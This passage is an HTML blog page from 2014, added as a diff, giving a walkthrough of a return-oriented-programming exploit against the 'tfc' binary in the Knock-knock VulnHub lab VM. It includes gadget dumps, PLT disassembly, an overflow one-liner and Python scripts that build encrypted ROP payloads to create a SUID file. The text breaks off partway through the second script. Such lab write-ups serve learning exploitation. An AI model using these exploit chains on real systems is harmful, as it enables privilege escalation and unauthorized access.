@@ -1,0 +1,506 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>Rop-rop for Knock-knock - staring into /dev/null</title>
+  <meta name="author" content="barrebas">
+
+  
+  <meta name="description" content="I couldn&rsquo;t resist to make a ROP exploit for tfc, the last binary to root knock-knock. I really like return-oriented-programming and I love to &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://barrebas.github.io/blog/2014/10/16/rop-rop-for-knock-knock">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="staring into /dev/null" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+  
+
+</head>
+
+<body   >
+  <header role="banner"><hgroup>
+  <h1><a href="/">staring into /dev/null</a></h1>
+  
+    <h2>barrebas</h2>
+  
+</hgroup>
+
+</header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="https://www.google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="q" value="site:barrebas.github.io" />
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Blog</a></li>
+  <li><a href="/blog/archives">Archives</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div>
+<article class="hentry" role="article">
+  
+  <header>
+    
+      <h1 class="entry-title">Rop-rop for Knock-knock</h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2014-10-16T19:37:39+02:00'><span class='date'><span class='date-month'>Oct</span> <span class='date-day'>16</span><span class='date-suffix'>th</span>, <span class='date-year'>2014</span></span> <span class='time'>7:37 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+<div class="entry-content"><p>I couldn&rsquo;t resist to make a ROP exploit for <code>tfc</code>, the last binary to root <a href="http://vulnhub.com/entry/knock-knock-11,105/">knock-knock</a>.</p>
+
+<!--more-->
+
+
+<p>I really like return-oriented-programming and I love to practice it! After seeing the awesome writeups for knock-knock by <a href="https://leonjza.github.io/blog/2014/10/14/knock-knock-whos-there-solving-knock-knock/">leonjza</a>, <a href="https://blog.techorganic.com/2014/10/15/knock-knock-hacking-challenge/">superkojiman</a> and <a href="https://knapsy.github.io/blog/2014/10/16/knock-knock-vm-walkthrough/">knapsy</a>, I was itching to see if I could pull a ROP exploit off. I knew about the buffer overflow, but what would I need to re-use code present in the binary? There are many &lsquo;types&rsquo; of ROP, such as <code>ret2libc</code> and chaining of so-called ROP gadgets. I first checked if there were enough gadgets to pull something off, like spawning a shell. <code>radare2</code> now has a nice feature where you can search for ROP gadgets with <code>/R</code>. Furthermore, <code>gdb-peda</code> has an awesome ROP gadget search function. Lastly, I <a href="https://gist.github.com/barrebas/4fc86eaf0e9b124813a3">built a custom ROP gadget dumper</a>. Not the most elegant solution, but it gives me a file I can <code>cat</code> and <code>grep</code>. Unfortunately, the amount of gadgets was only 107 and they weren&rsquo;t really useful, either. Back to the drawing board!</p>
+
+<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="c"># sample output of ropgadgets.py</span>
+RET: 0x8048921: add cl, cl<span class="p">;</span> ret<span class="p">;</span> 
+RET: 0x804891f: add <span class="o">[</span>eax<span class="o">]</span>, al<span class="p">;</span> add cl, cl<span class="p">;</span> ret<span class="p">;</span> 
+CALL_REG: 0x8048917: and al, 0xe8<span class="p">;</span> call ebx<span class="p">;</span> 
+CALL_REG: 0x8048911: dec dword <span class="o">[</span>ebx+0x489f045<span class="o">]</span><span class="p">;</span> and al, 0xe8<span class="p">;</span> call ebx<span class="p">;</span> 
+JMP_REG: 0x8048753: and al, 0xe8<span class="p">;</span> jmp edi<span class="p">;</span> 
+JMP_REG: 0x804874d: fisttp dword <span class="o">[</span>edx+0x4890804<span class="o">]</span><span class="p">;</span> and al, 0xe8<span class="p">;</span> jmp edi<span class="p">;</span> 
+JMP_REG: 0x804874b: and al, 0x4<span class="p">;</span> fisttp dword <span class="o">[</span>edx+0x4890804<span class="o">]</span><span class="p">;</span> and al, 0xe8<span class="p">;</span> jmp edi<span class="p">;</span> 
+JMP_REG: 0x804874a: inc esp<span class="p">;</span> and al, 0x4<span class="p">;</span> fisttp dword <span class="o">[</span>edx+0x4890804<span class="o">]</span><span class="p">;</span> and al, 0xe8<span class="p">;</span> jmp edi<span class="p">;</span> 
+JMP_REG: 0x8048748: add edi, eax<span class="p">;</span> inc esp<span class="p">;</span> and al, 0x4<span class="p">;</span> fisttp dword <span class="o">[</span>edx+0x4890804<span class="o">]</span><span class="p">;</span> and al, 0xe8<span class="p">;</span> jmp edi<span class="p">;</span> 
+JMP_REG: 0x8048747: rol byte <span class="o">[</span>ecx<span class="o">]</span>, 0xc7<span class="p">;</span> inc esp<span class="p">;</span> and al, 0x4<span class="p">;</span> fisttp dword <span class="o">[</span>edx+0x4890804<span class="o">]</span><span class="p">;</span> and al, 0xe8<span class="p">;</span> jmp edi<span class="p">;</span> 
+RET: 0x80486e3: add cl, cl<span class="p">;</span> ret<span class="p">;</span> 
+RET: 0x80486e1: add <span class="o">[</span>eax<span class="o">]</span>, al<span class="p">;</span> add cl, cl<span class="p">;</span> ret<span class="p">;</span> 
+RET: 0x8048615: dec ecx<span class="p">;</span> ret<span class="p">;</span></code></pre></div>
+
+
+<p>There are more ways to go about this problem. We want to do something that will lead to a root shell, without actually executing shellcode on the stack. But without enough gadgets, we&rsquo;re left with not much else. But wait! We still have access to the functions that the binary uses.</p>
+
+<div class="highlight"><pre><code class="language-bash" data-lang="bash">bas@tritonal:~/tmp/knockknock<span class="nv">$ </span>objdump -d tfc <span class="p">|</span>grep <span class="s2">&quot;.plt&quot;</span> 
+Disassembly of section .plt:
+
+<span class="m">08048430</span> &lt;strcmp@plt-0x10&gt;:
+ 8048430:   ff <span class="m">35</span> 4c 9d <span class="m">04</span> <span class="m">08</span>      pushl  0x8049d4c
+ 8048436:   ff <span class="m">25</span> <span class="m">50</span> 9d <span class="m">04</span> <span class="m">08</span>       jmp    *0x8049d50
+ 804843c:   <span class="m">00</span> <span class="m">00</span>                 add    %al,<span class="o">(</span>%eax<span class="o">)</span>
+    ...
+
+<span class="m">08048440</span> &lt;strcmp@plt&gt;:
+ 8048440:   ff <span class="m">25</span> <span class="m">54</span> 9d <span class="m">04</span> <span class="m">08</span>       jmp    *0x8049d54
+ 8048446:   <span class="m">68</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>           push   <span class="nv">$0x0</span>
+ 804844b:   e9 e0 ff ff ff          jmp    <span class="m">8048430</span> &lt;_init+0x2c&gt;
+
+<span class="m">08048450</span> &lt;<span class="nb">read</span>@plt&gt;:
+ 8048450:   ff <span class="m">25</span> <span class="m">58</span> 9d <span class="m">04</span> <span class="m">08</span>       jmp    *0x8049d58
+ 8048456:   <span class="m">68</span> <span class="m">08</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>           push   <span class="nv">$0x8</span>
+ 804845b:   e9 d0 ff ff ff          jmp    <span class="m">8048430</span> &lt;_init+0x2c&gt;
+
+<span class="m">08048460</span> &lt;<span class="nb">printf</span>@plt&gt;:
+ 8048460:   ff <span class="m">25</span> 5c 9d <span class="m">04</span> <span class="m">08</span>      jmp    *0x8049d5c
+ 8048466:   <span class="m">68</span> <span class="m">10</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>           push   <span class="nv">$0x10</span>
+ 804846b:   e9 c0 ff ff ff          jmp    <span class="m">8048430</span> &lt;_init+0x2c&gt;
+
+<span class="m">08048470</span> &lt;__xstat@plt&gt;:
+ 8048470:   ff <span class="m">25</span> <span class="m">60</span> 9d <span class="m">04</span> <span class="m">08</span>       jmp    *0x8049d60
+ 8048476:   <span class="m">68</span> <span class="m">18</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>           push   <span class="nv">$0x18</span>
+ 804847b:   e9 b0 ff ff ff          jmp    <span class="m">8048430</span> &lt;_init+0x2c&gt;
+
+<span class="m">08048480</span> &lt;puts@plt&gt;:
+ 8048480:   ff <span class="m">25</span> <span class="m">64</span> 9d <span class="m">04</span> <span class="m">08</span>       jmp    *0x8049d64
+ 8048486:   <span class="m">68</span> <span class="m">20</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>           push   <span class="nv">$0x20</span>
+ 804848b:   e9 a0 ff ff ff          jmp    <span class="m">8048430</span> &lt;_init+0x2c&gt;
+
+<span class="m">08048490</span> &lt;__gmon_start__@plt&gt;:
+ 8048490:   ff <span class="m">25</span> <span class="m">68</span> 9d <span class="m">04</span> <span class="m">08</span>       jmp    *0x8049d68
+ 8048496:   <span class="m">68</span> <span class="m">28</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>           push   <span class="nv">$0x28</span>
+ 804849b:   e9 <span class="m">90</span> ff ff ff           jmp    <span class="m">8048430</span> &lt;_init+0x2c&gt;
+
+080484a0 &lt;open@plt&gt;:
+ 80484a0:   ff <span class="m">25</span> 6c 9d <span class="m">04</span> <span class="m">08</span>      jmp    *0x8049d6c
+ 80484a6:   <span class="m">68</span> <span class="m">30</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>           push   <span class="nv">$0x30</span>
+ 80484ab:   e9 <span class="m">80</span> ff ff ff           jmp    <span class="m">8048430</span> &lt;_init+0x2c&gt;
+
+080484b0 &lt;__libc_start_main@plt&gt;:
+ 80484b0:   ff <span class="m">25</span> <span class="m">70</span> 9d <span class="m">04</span> <span class="m">08</span>       jmp    *0x8049d70
+ 80484b6:   <span class="m">68</span> <span class="m">38</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>           push   <span class="nv">$0x38</span>
+ 80484bb:   e9 <span class="m">70</span> ff ff ff           jmp    <span class="m">8048430</span> &lt;_init+0x2c&gt;
+
+080484c0 &lt;write@plt&gt;:
+ 80484c0:   ff <span class="m">25</span> <span class="m">74</span> 9d <span class="m">04</span> <span class="m">08</span>       jmp    *0x8049d74
+ 80484c6:   <span class="m">68</span> <span class="m">40</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>           push   <span class="nv">$0x40</span>
+ 80484cb:   e9 <span class="m">60</span> ff ff ff           jmp    <span class="m">8048430</span> &lt;_init+0x2c&gt;
+
+080484d0 &lt;strrchr@plt&gt;:
+ 80484d0:   ff <span class="m">25</span> <span class="m">78</span> 9d <span class="m">04</span> <span class="m">08</span>       jmp    *0x8049d78
+ 80484d6:   <span class="m">68</span> <span class="m">48</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>           push   <span class="nv">$0x48</span>
+ 80484db:   e9 <span class="m">50</span> ff ff ff           jmp    <span class="m">8048430</span> &lt;_init+0x2c&gt;
+
+080484e0 &lt;__lxstat@plt&gt;:
+ 80484e0:   ff <span class="m">25</span> 7c 9d <span class="m">04</span> <span class="m">08</span>      jmp    *0x8049d7c
+ 80484e6:   <span class="m">68</span> <span class="m">50</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>           push   <span class="nv">$0x50</span>
+ 80484eb:   e9 <span class="m">40</span> ff ff ff           jmp    <span class="m">8048430</span> &lt;_init+0x2c&gt;
+
+080484f0 &lt;close@plt&gt;:
+ 80484f0:   ff <span class="m">25</span> <span class="m">80</span> 9d <span class="m">04</span> <span class="m">08</span>       jmp    *0x8049d80
+ 80484f6:   <span class="m">68</span> <span class="m">58</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>           push   <span class="nv">$0x58</span>
+ 80484fb:   e9 <span class="m">30</span> ff ff ff           jmp    <span class="m">8048430</span> &lt;_init+0x2c&gt;</code></pre></div>
+
+
+<p>We can re-use <code>open</code>, <code>read</code> and <code>write</code> to basically read and write any file we want! I began to write a basic Proof of Concept ROP chain. This chain would simply write to a file descriptor that is already open, because these file descriptors are incremented every time a file is opened and therefore guessable. This will help later on, when we open our own files. Without gadgets, it is hard to pass values from one function call to the next&hellip; Luckily, 0x0 through 0x2 are used for stdin, stdout and stderr, and any file that is opened after that gets 0x3. The next one gets 0x4, and so on. This means that <code>in.tfc</code> is 0x3 and <code>out.tfc</code> is 0x4.</p>
+
+<p>I searched for the address of <code>write@plt</code> which turned out to be <code>0x80484c0</code>. I leveraged my buffer overflow from before. The buffer overflows, <code>eip</code> is overwritten with the address of <code>write</code>, which then executes with some variables conveniently placed on the stack. So at the point of gaining control of <code>eip</code>:</p>
+
+<div class="highlight"><pre><code class="language-c" data-lang="c"><span class="n">esp</span><span class="o">-</span><span class="mo">04</span><span class="o">:</span> <span class="n">AAAA</span>
+<span class="nl">esp</span>   <span class="p">:</span> <span class="mh">0x80484c0</span>   <span class="err">#</span> <span class="k">return</span> <span class="n">to</span> <span class="err">&#39;</span><span class="n">write</span><span class="err">&#39;</span>
+<span class="n">esp</span><span class="o">+</span><span class="mo">04</span><span class="o">:</span> <span class="n">FAKE</span>        <span class="err">#</span> <span class="n">fake</span> <span class="k">return</span> <span class="n">address</span> <span class="k">for</span> <span class="n">when</span> <span class="err">&#39;</span><span class="n">write</span><span class="err">&#39;</span> <span class="n">complets</span>
+<span class="n">esp</span><span class="o">+</span><span class="mi">08</span><span class="o">:</span> <span class="mh">0x4</span>         <span class="err">#</span> <span class="n">this</span> <span class="n">is</span> <span class="n">the</span> <span class="n">file</span> <span class="n">descriptor</span> <span class="k">for</span> <span class="err">&#39;</span><span class="n">out</span><span class="p">.</span><span class="n">tfc</span><span class="err">&#39;</span>
+<span class="n">esp</span><span class="o">+</span><span class="mi">0</span><span class="nl">c</span><span class="p">:</span> <span class="mh">0x80488b0</span>   <span class="err">#</span> <span class="n">random</span> <span class="n">value</span> <span class="k">for</span> <span class="n">buffer</span><span class="p">,</span> <span class="n">contains</span> <span class="n">the</span> <span class="n">bytes</span> <span class="mi">8</span><span class="n">b</span> <span class="mi">45</span> <span class="n">ec</span>
+<span class="n">esp</span><span class="o">+</span><span class="mi">10</span><span class="o">:</span> <span class="mh">0x3</span>         <span class="err">#</span> <span class="n">length</span> <span class="n">of</span> <span class="n">buffer</span></code></pre></div>
+
+
+<p>I ran this through the encryption Python script and fed the output to <code>tfc</code>:</p>
+
+<div class="highlight"><pre><code class="language-bash" data-lang="bash">python -c <span class="s1">&#39;print &quot;A&quot;*4124 + &quot;\xc0\x84\x04\x08AAAA\x04\x00\x00\x00\xb0\x88\x04\x08\x03\x00\x00\x00&quot;&#39;</span> &gt; in.tfc <span class="o">&amp;&amp;</span> python ./enc.py
+bas@tritonal:~/tmp/knockknock<span class="nv">$ </span>./tfc out2.tfc test5.tfc
+Segmentation fault <span class="o">(</span>core dumped<span class="o">)</span>
+bas@tritonal:~/tmp/knockknock<span class="nv">$ </span>xxd test5.tfc
+0000000: 8b45 ec</code></pre></div>
+
+
+<p>Success! The three bytes from the buffer are written into <code>test5.tfc</code>. This isn&rsquo;t very useful yet, so I decided to create my own file first. This way, we can specify permissions, such as having the SUID bit set! The plan, in very ugly pseudo-code, is:</p>
+
+<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">file1</span> <span class="o">=</span> open<span class="o">(</span><span class="s1">&#39;file1&#39;</span>, <span class="s1">&#39;w&#39;</span>, 04777<span class="o">)</span>
+<span class="nv">file2</span> <span class="o">=</span> open<span class="o">(</span><span class="s1">&#39;file2&#39;</span>, <span class="s1">&#39;r&#39;</span><span class="o">)</span>
+<span class="nb">read</span><span class="o">(</span>file2, <span class="p">&amp;</span>buf, sizeof<span class="o">(</span>file2<span class="o">))</span>
+write<span class="o">(</span>file1, <span class="p">&amp;</span>buf, sizeof<span class="o">(</span>file1<span class="o">))</span></code></pre></div>
+
+
+<p>I&rsquo;ll go step by step. First, let&rsquo;s open our own file. The functions <a href="http://linux.die.net/man/2/open">open</a> and <a href="http://linux.die.net/man/2/write">write</a> look like this:</p>
+
+<div class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="nf">open</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">pathname</span><span class="p">,</span> <span class="kt">int</span> <span class="n">flags</span><span class="p">,</span> <span class="kt">mode_t</span> <span class="n">mode</span><span class="p">);</span>
+<span class="kt">ssize_t</span> <span class="nf">write</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">,</span> <span class="k">const</span> <span class="kt">void</span> <span class="o">*</span><span class="n">buf</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">count</span><span class="p">);</span></code></pre></div>
+
+
+<p>There are several challenges here. First, we cannot specify our own filename, because we cannot pass strings to the program and know where they&rsquo;ll end up on the stack. Second, we can&rsquo;t pass the filehandle around. Third, I have no clue how <code>flags</code> and <code>mode</code> work, in binary. Fourth, we need some way to clean up the stack so we can chain these libc calls together.</p>
+
+<p>Overcoming the first challenge is easy. <code>tfc</code> contains several strings which we can re-use. I chose &lsquo;read&rsquo; as I though it was fitting. It&rsquo;s located at <code>0x8049315</code>. For the output file, I already looked up the location of &lsquo;write&rsquo; at <code>0x804933e</code>. I then proceeded to make a small binary, to get the values for <code>flags</code> and <code>mode</code>:</p>
+
+<div class="highlight"><pre><code class="language-c" data-lang="c"><span class="cp">#include &lt;stdio.h&gt;</span>
+<span class="cp">#include &lt;stdlib.h&gt;</span>
+<span class="cp">#include &lt;sys/types.h&gt;</span>
+<span class="cp">#include &lt;sys/stat.h&gt;</span>
+<span class="cp">#include &lt;fcntl.h&gt;</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span> 
+<span class="p">{</span>
+    <span class="kt">FILE</span> <span class="o">*</span><span class="n">f</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">&quot;test&quot;</span><span class="p">,</span> <span class="n">O_WRONLY</span><span class="o">|</span><span class="n">O_APPEND</span><span class="o">|</span><span class="n">O_CREAT</span><span class="p">,</span> <span class="mo">04755</span><span class="p">);</span>
+    <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+<span class="p">}</span></code></pre></div>
+
+
+
+
+<div class="highlight"><pre><code class="language-bash" data-lang="bash">bas@tritonal:~/tmp/knockknock<span class="nv">$ </span>objdump -d a.out <span class="p">|</span>grep open -B4
+--
+  400579:   ba ed <span class="m">09</span> <span class="m">00</span> <span class="m">00</span>         mov    <span class="nv">$0x9ed</span>,%edx
+  40057e:   be <span class="m">41</span> <span class="m">04</span> <span class="m">00</span> <span class="m">00</span>          mov    <span class="nv">$0x441</span>,%esi
+  400583:   bf <span class="m">34</span> <span class="m">06</span> <span class="m">40</span> <span class="m">00</span>          mov    <span class="nv">$0x400634</span>,%edi
+  400588:   b8 <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>          mov    <span class="nv">$0x0</span>,%eax
+  40058d:   e8 ce fe ff ff          callq  <span class="m">400460</span> &lt;open@plt&gt;</code></pre></div>
+
+
+<p>Finally, cleaning up the stack so we can chain libc calls can be done with a primitive called <code>pop pop pop ret</code>. The return address for the libc calls is a place in the binary that contains three pop instructions, which pop three values from the stack, and then return to whatever value is on the stack. This allows code execution to continue smoothly, otherwise it might choke on one of the values that we pass to a libc function. I used my ropgadget script to find it at <code>0x80489d6</code>; there are many more, and many other ways to find them. So we have all the values we need, let&rsquo;s put it together in a semi-smart and flexible way. I made a python script to handle building and encrypting the payload:</p>
+
+<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="c">#!/usr/bin/python</span>
+<span class="kn">import</span> <span class="nn">struct</span><span class="o">,</span> <span class="nn">sys</span>
+
+<span class="k">def</span> <span class="nf">p</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
+    <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;&lt;i&#39;</span><span class="p">,</span> <span class="n">x</span><span class="p">)</span>
+    
+<span class="k">def</span> <span class="nf">xcrypt</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
+    <span class="n">xor_key</span> <span class="o">=</span> <span class="mh">0xea1ab19f</span> 
+    
+    <span class="n">output</span> <span class="o">=</span> <span class="s">&#39;&#39;</span>
+    
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span><span class="o">/</span><span class="mi">4</span><span class="p">):</span>
+        <span class="n">block</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span> <span class="s">&#39;&lt;L&#39;</span><span class="p">,</span> <span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="o">*</span><span class="mi">4</span> <span class="p">:</span> <span class="p">(</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span><span class="o">*</span><span class="mi">4</span><span class="p">]</span> <span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
+        <span class="n">output</span> <span class="o">+=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span> <span class="s">&#39;&lt;L&#39;</span><span class="p">,</span> <span class="p">(</span><span class="n">block</span> <span class="o">^</span> <span class="n">xor_key</span><span class="p">)</span> <span class="p">)</span>
+        
+        <span class="k">for</span> <span class="n">n</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">8</span><span class="p">):</span>
+            <span class="n">temp_xor_key</span> <span class="o">=</span> <span class="n">xor_key</span> <span class="o">&gt;&gt;</span> <span class="mi">1</span>
+            <span class="k">if</span> <span class="p">(</span><span class="n">xor_key</span> <span class="o">&amp;</span> <span class="mi">1</span><span class="p">):</span>
+                <span class="n">temp_xor_key</span> <span class="o">^=</span> <span class="mh">0x6daa1cf4</span>
+            <span class="n">xor_key</span> <span class="o">=</span> <span class="n">temp_xor_key</span>
+    
+    <span class="k">return</span> <span class="n">output</span>
+    
+<span class="k">def</span> <span class="nf">genPayload</span><span class="p">():</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="s">&#39;&#39;</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;A&quot;</span><span class="o">*</span><span class="mi">4124</span>
+
+    <span class="c"># open(&#39;write&#39;) for writing. fd = 0x05</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x80484a0</span><span class="p">)</span> <span class="c"># open@plt()</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x80489d6</span><span class="p">)</span> <span class="c"># pppr</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x804933e</span><span class="p">)</span> <span class="c"># &quot;write\x00&quot;</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x441</span><span class="p">)</span> <span class="c"># O_WRONLY|O_CREAT|O_APPEND</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x9ed</span><span class="p">)</span> <span class="c"># 04755</span>
+
+    <span class="c"># write 0x200 bytes to &#39;write&#39;</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x80484c0</span><span class="p">)</span> <span class="c"># write@plt()</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x80489d6</span><span class="p">)</span> <span class="c"># pppr</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x5</span><span class="p">)</span>        <span class="c"># fd</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x8049db8</span><span class="p">)</span>  <span class="c"># buffer</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x200</span><span class="p">)</span>      <span class="c"># size_t</span>
+
+    <span class="k">return</span> <span class="n">xcrypt</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+    
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">&quot;__main__&quot;</span><span class="p">:</span>
+    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">&#39;out.tfc&#39;</span><span class="p">,</span> <span class="s">&#39;w&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+        <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">genPayload</span><span class="p">())</span>
+        <span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span></code></pre></div>
+
+
+<p>OK, so I&rsquo;m already ahead a bit. We will need a buffer to store bytes from the &lsquo;read&rsquo; file later. The binary does not seem to have a lot of locations for this, as can be seen from <code>readelf -a ./tfc</code>. I picked this location, because it was writeable, had a decent number of bytes behind it and did not contain important code we need later on. For instace, <code>.got</code> is writeable, but we need the functions in there so we can&rsquo;t go and overwrite them, can we?!</p>
+
+<p>While we&rsquo;re at it, let&rsquo;s make sure we can read and write large files. Unfortunately, the buffer is only 0x200 bytes large. This means we have to chunk it up!</p>
+
+<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="c">#!/usr/bin/python</span>
+<span class="kn">import</span> <span class="nn">struct</span><span class="o">,</span> <span class="nn">sys</span>
+
+<span class="k">def</span> <span class="nf">p</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
+    <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;&lt;i&#39;</span><span class="p">,</span> <span class="n">x</span><span class="p">)</span>
+    
+<span class="k">def</span> <span class="nf">xcrypt</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
+    <span class="n">xor_key</span> <span class="o">=</span> <span class="mh">0xea1ab19f</span> 
+    
+    <span class="n">output</span> <span class="o">=</span> <span class="s">&#39;&#39;</span>
+    
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span><span class="o">/</span><span class="mi">4</span><span class="p">):</span>
+        <span class="n">block</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span> <span class="s">&#39;&lt;L&#39;</span><span class="p">,</span> <span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="o">*</span><span class="mi">4</span> <span class="p">:</span> <span class="p">(</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span><span class="o">*</span><span class="mi">4</span><span class="p">]</span> <span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
+        <span class="n">output</span> <span class="o">+=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span> <span class="s">&#39;&lt;L&#39;</span><span class="p">,</span> <span class="p">(</span><span class="n">block</span> <span class="o">^</span> <span class="n">xor_key</span><span class="p">)</span> <span class="p">)</span>
+        
+        <span class="k">for</span> <span class="n">n</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">8</span><span class="p">):</span>
+            <span class="n">temp_xor_key</span> <span class="o">=</span> <span class="n">xor_key</span> <span class="o">&gt;&gt;</span> <span class="mi">1</span>
+            <span class="k">if</span> <span class="p">(</span><span class="n">xor_key</span> <span class="o">&amp;</span> <span class="mi">1</span><span class="p">):</span>
+                <span class="n">temp_xor_key</span> <span class="o">^=</span> <span class="mh">0x6daa1cf4</span>
+            <span class="n">xor_key</span> <span class="o">=</span> <span class="n">temp_xor_key</span>
+    
+    <span class="k">return</span> <span class="n">output</span>
+    
+<span class="k">def</span> <span class="nf">genPayload</span><span class="p">(</span><span class="n">filesize</span><span class="p">):</span>
+    <span class="k">print</span> <span class="s">&quot;[!] filesize = {}&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">filesize</span><span class="p">)</span>
+    
+    <span class="n">payload</span> <span class="o">=</span> <span class="s">&#39;&#39;</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;A&quot;</span><span class="o">*</span><span class="mi">4124</span>
+
+    <span class="c"># open(&#39;write&#39;) for writing. fd = 0x05</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x80484a0</span><span class="p">)</span> <span class="c"># open@plt()</span>
